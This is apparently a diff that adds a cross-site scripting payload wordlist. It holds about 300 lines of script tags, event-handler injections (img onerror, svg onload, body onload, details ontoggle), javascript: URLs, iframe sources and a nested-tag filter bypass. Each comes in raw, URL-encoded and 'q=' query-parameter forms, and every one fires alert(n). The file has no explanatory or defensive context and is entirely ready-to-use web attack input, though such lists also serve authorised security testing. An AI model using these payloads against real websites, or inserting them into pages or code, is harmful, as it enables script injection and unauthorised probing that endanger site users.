@@ -1,1 +1,300 @@
-404: Not Found
+"'><script>alert(1)</script>
+"'><script>alert(10)</script>
+"'><script>alert(11)</script>
+"'><script>alert(2)</script>
+"'><script>alert(3)</script>
+"'><script>alert(5)</script>
+"'><script>alert(6)</script>
+"'><script>alert(7)</script>
+"'><script>alert(8)</script>
+"'><script>alert(9)</script>
+%22%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%2810%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%2811%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%283%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%284%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%286%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%287%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%288%29%3C%2Fscript%3E
+%22%27%3E%3Cscript%3Ealert%289%29%3C%2Fscript%3E
+%3Ca%20href%3Djavascript%3Aalert%2810%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%2811%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%282%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%283%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%284%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%285%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%286%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%287%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%288%29%3Eclick%3C%2Fa%3E
+%3Ca%20href%3Djavascript%3Aalert%289%29%3Eclick%3C%2Fa%3E
+%3Cbody%20onload%3Dalert%281%29%3E
+%3Cbody%20onload%3Dalert%2810%29%3E
+%3Cbody%20onload%3Dalert%2811%29%3E
+%3Cbody%20onload%3Dalert%282%29%3E
+%3Cbody%20onload%3Dalert%283%29%3E
+%3Cbody%20onload%3Dalert%284%29%3E
+%3Cbody%20onload%3Dalert%285%29%3E
+%3Cbody%20onload%3Dalert%286%29%3E
+%3Cbody%20onload%3Dalert%287%29%3E
+%3Cbody%20onload%3Dalert%288%29%3E
+%3Cbody%20onload%3Dalert%289%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%2810%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%2811%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%282%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%283%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%284%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%285%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%286%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%287%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%288%29%3E
+%3Cdetails%20open%20ontoggle%3Dalert%289%29%3E
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%2810%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%2811%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%282%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%283%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%284%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%285%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%286%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%287%29%3E%3C%2Fiframe%3E
+%3Ciframe%20src%3Djavascript%3Aalert%288%29%3E%3C%2Fiframe%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%2810%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%2811%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%284%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%285%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%286%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%287%29%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%2810%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%2811%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%286%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%287%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%288%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscr%3Cscript%3Eipt%3Ealert%289%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%3Cscript%3Ealert%2810%29%3C%2Fscript%3E
+%3Cscript%3Ealert%2811%29%3C%2Fscript%3E
+%3Cscript%3Ealert%282%29%3C%2Fscript%3E
+%3Cscript%3Ealert%283%29%3C%2Fscript%3E
+%3Cscript%3Ealert%284%29%3C%2Fscript%3E
+%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+%3Cscript%3Ealert%286%29%3C%2Fscript%3E
+%3Cscript%3Ealert%287%29%3C%2Fscript%3E
+%3Cscript%3Ealert%288%29%3C%2Fscript%3E
+%3Cscript%3Ealert%289%29%3C%2Fscript%3E
+%3Csvg%20onload%3Dalert%281%29%3E
+%3Csvg%20onload%3Dalert%2810%29%3E
+%3Csvg%20onload%3Dalert%2811%29%3E
+%3Csvg%20onload%3Dalert%282%29%3E
+%3Csvg%20onload%3Dalert%283%29%3E
+%3Csvg%20onload%3Dalert%284%29%3E
+%3Csvg%20onload%3Dalert%285%29%3E
+%3Csvg%20onload%3Dalert%286%29%3E
+%3Csvg%20onload%3Dalert%287%29%3E
+%3Csvg%20onload%3Dalert%288%29%3E
+%3Csvg%20onload%3Dalert%289%29%3E
+<a href=javascript:alert(1)>click</a>
+<a href=javascript:alert(10)>click</a>
+<a href=javascript:alert(11)>click</a>
+<a href=javascript:alert(2)>click</a>
+<a href=javascript:alert(3)>click</a>
+<a href=javascript:alert(4)>click</a>
+<a href=javascript:alert(5)>click</a>
+<a href=javascript:alert(6)>click</a>
+<a href=javascript:alert(7)>click</a>
+<a href=javascript:alert(8)>click</a>
+<a href=javascript:alert(9)>click</a>
+<body onload=alert(1)>
+<body onload=alert(10)>
+<body onload=alert(11)>
+<body onload=alert(2)>
+<body onload=alert(3)>
+<body onload=alert(4)>
+<body onload=alert(5)>
+<body onload=alert(6)>
+<body onload=alert(8)>
+<body onload=alert(9)>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert(10)>
+<details open ontoggle=alert(11)>
+<details open ontoggle=alert(2)>
+<details open ontoggle=alert(3)>
+<details open ontoggle=alert(4)>
+<details open ontoggle=alert(5)>
+<details open ontoggle=alert(6)>
+<details open ontoggle=alert(7)>
+<details open ontoggle=alert(9)>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src=javascript:alert(10)></iframe>
+<iframe src=javascript:alert(11)></iframe>
+<iframe src=javascript:alert(2)></iframe>
+<iframe src=javascript:alert(3)></iframe>
+<iframe src=javascript:alert(4)></iframe>
+<iframe src=javascript:alert(6)></iframe>
+<iframe src=javascript:alert(7)></iframe>
+<iframe src=javascript:alert(8)></iframe>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(10)>
+<img src=x onerror=alert(11)>
+<img src=x onerror=alert(2)>
+<img src=x onerror=alert(3)>
+<img src=x onerror=alert(4)>
+<img src=x onerror=alert(5)>
+<img src=x onerror=alert(6)>
+<img src=x onerror=alert(7)>
+<img src=x onerror=alert(8)>
+<img src=x onerror=alert(9)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(10)</scr</script>ipt>
+<scr<script>ipt>alert(11)</scr</script>ipt>
+<scr<script>ipt>alert(3)</scr</script>ipt>
+<scr<script>ipt>alert(4)</scr</script>ipt>
+<scr<script>ipt>alert(5)</scr</script>ipt>
+<scr<script>ipt>alert(6)</scr</script>ipt>
+<scr<script>ipt>alert(8)</scr</script>ipt>
+<scr<script>ipt>alert(9)</scr</script>ipt>
+<script>alert(1)</script>
+<script>alert(10)</script>
+<script>alert(11)</script>
+<script>alert(2)</script>
+<script>alert(3)</script>
+<script>alert(4)</script>
+<script>alert(5)</script>
+<script>alert(6)</script>
+<script>alert(7)</script>
+<script>alert(8)</script>
+<script>alert(9)</script>
+<svg onload=alert(1)>
+<svg onload=alert(10)>
+<svg onload=alert(11)>
+<svg onload=alert(2)>
+<svg onload=alert(3)>
+<svg onload=alert(4)>
+<svg onload=alert(5)>
+<svg onload=alert(6)>
+<svg onload=alert(8)>
+<svg onload=alert(9)>
+javascript%3Aalert%281%29
+javascript%3Aalert%2810%29
+javascript%3Aalert%2811%29
+javascript%3Aalert%282%29
+javascript%3Aalert%283%29
+javascript%3Aalert%285%29
+javascript%3Aalert%286%29
+javascript%3Aalert%287%29
+javascript%3Aalert%288%29
+javascript%3Aalert%289%29
+javascript:alert(1)
+javascript:alert(10)
+javascript:alert(11)
+javascript:alert(2)
+javascript:alert(3)
+javascript:alert(4)
+javascript:alert(5)
+javascript:alert(6)
+javascript:alert(7)
+javascript:alert(8)
+q=%22%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%2810%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%2811%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%283%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%284%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%286%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%287%29%3C%2Fscript%3E
+q=%22%27%3E%3Cscript%3Ealert%288%29%3C%2Fscript%3E
+q=%3Ca%20href%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%2810%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%2811%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%282%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%284%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%285%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%286%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%288%29%3Eclick%3C%2Fa%3E
+q=%3Ca%20href%3Djavascript%3Aalert%289%29%3Eclick%3C%2Fa%3E
+q=%3Cbody%20onload%3Dalert%281%29%3E
+q=%3Cbody%20onload%3Dalert%2810%29%3E
+q=%3Cbody%20onload%3Dalert%2811%29%3E
+q=%3Cbody%20onload%3Dalert%282%29%3E
+q=%3Cbody%20onload%3Dalert%283%29%3E
+q=%3Cbody%20onload%3Dalert%285%29%3E
+q=%3Cbody%20onload%3Dalert%286%29%3E
+q=%3Cbody%20onload%3Dalert%287%29%3E
+q=%3Cbody%20onload%3Dalert%288%29%3E
+q=%3Cbody%20onload%3Dalert%289%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%2811%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%282%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%283%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%284%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%285%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%286%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%287%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%288%29%3E
+q=%3Cdetails%20open%20ontoggle%3Dalert%289%29%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%2810%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%2811%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%282%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%283%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%285%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%287%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%288%29%3E%3C%2Fiframe%3E
+q=%3Ciframe%20src%3Djavascript%3Aalert%289%29%3E%3C%2Fiframe%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%2811%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%283%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%284%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%285%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%286%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%287%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%288%29%3E
+q=%3Cimg%20src%3Dx%20onerror%3Dalert%289%29%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%2810%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%2811%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%286%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%288%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscr%3Cscript%3Eipt%3Ealert%289%29%3C%2Fscr%3C%2Fscript%3Eipt%3E
+q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%2811%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%282%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%283%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%284%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%285%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%286%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%288%29%3C%2Fscript%3E
+q=%3Cscript%3Ealert%289%29%3C%2Fscript%3E
+q=%3Csvg%20onload%3Dalert%281%29%3E
+q=%3Csvg%20onload%3Dalert%2810%29%3E
+q=%3Csvg%20onload%3Dalert%2811%29%3E
+q=%3Csvg%20onload%3Dalert%282%29%3E
+q=%3Csvg%20onload%3Dalert%283%29%3E
+q=%3Csvg%20onload%3Dalert%284%29%3E
+q=%3Csvg%20onload%3Dalert%285%29%3E
+q=%3Csvg%20onload%3Dalert%286%29%3E
+q=%3Csvg%20onload%3Dalert%288%29%3E
+q=%3Csvg%20onload%3Dalert%289%29%3E
+q=javascript%3Aalert%281%29
+q=javascript%3Aalert%2810%29
+q=javascript%3Aalert%2811%29
+q=javascript%3Aalert%283%29
+q=javascript%3Aalert%284%29
+q=javascript%3Aalert%285%29
+q=javascript%3Aalert%286%29
+q=javascript%3Aalert%287%29
+q=javascript%3Aalert%288%29
+q=javascript%3Aalert%289%29
